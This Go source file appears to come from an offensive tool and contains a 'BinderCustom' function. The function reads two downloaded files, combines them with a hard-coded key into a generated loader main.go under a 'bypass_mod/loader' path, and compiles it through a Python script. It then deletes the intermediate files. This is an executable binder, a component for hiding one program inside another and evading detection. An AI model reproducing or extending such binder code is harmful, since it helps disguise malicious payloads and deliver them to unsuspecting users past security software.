package service

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"path"
)

func BinderCustom(binderFilePath2 string, binderFileName2 string, binderFilePath3 string, binderFileName3 string) { // 主
	file2 := fileReader(binderFilePath2) //读取下载下来文件的[]byte
	file3 := fileReader(binderFilePath3) //读取下载下来文件的[]byte
	defer Delete_File(binderFilePath3)
	defer Delete_File("./" + binderFileName2 + ".exe")
	BinderFileExe := BinderFileExe(binderFileName2, binderFileName3, "1234567890987654", file2, file3)
	fileObjBinderFileExe, err1 := os.OpenFile("F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/loader/main.go", os.O_TRUNC|os.O_CREATE|os.O_WRONLY, 0644)
	defer Delete_File("F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/bypass_mod/loader/main.go")
	if err1 != nil {
		fmt.Println("打开文件出错了:", err1)
		return
	}
	defer fileObjBinderFileExe.Close()
	BinderFileExewr := bufio.NewWriter(fileObjBinderFileExe)
	BinderFileExewr.WriteString(BinderFileExe)
	BinderFileExewr.Flush()
	filenameall3 := path.Base(binderFileName3)
	filesuffix3 := path.Ext(binderFileName3)
	binderFileName3S := filenameall3[0 : len(filenameall3)-len(filesuffix3)]
	exec.Command("python", "F:/Go_Work/src/github.com/ed11s00n/coolv0.1/cool/service/executable/compile.py", "-w", "BinderCustom", "-f", binderFileName3S+"new").Run() //, "-ldflags=\"-H", "windowsgui\""
}
